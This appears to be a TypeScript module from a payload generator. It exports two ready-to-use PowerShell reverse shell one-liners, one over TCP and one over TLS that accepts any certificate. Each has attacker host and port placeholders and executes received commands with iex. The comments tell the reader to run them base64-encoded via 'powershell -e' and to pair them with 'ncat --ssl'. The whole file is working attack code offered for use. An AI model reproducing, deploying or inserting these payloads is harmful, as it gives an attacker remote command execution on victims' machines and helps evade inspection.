/** The PowerShell TCP reverse shell (one line), with {LHOST} and {LPORT} to fill. Run it base64'd with `powershell -e`. */
export const POWERSHELL_TCP =
  '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};' +
  "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
  '$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' +
  "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

/** The PowerShell TLS reverse shell (one line): TCP over an SslStream that accepts any certificate. Pairs with `ncat --ssl`. */
export const POWERSHELL_TLS =
  '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});' +
  "$stream = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]));" +
  '$stream.AuthenticateAsClient("{LHOST}");[byte[]]$bytes = 0..65535|%{0};' +
  "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
  '$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' +
  "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
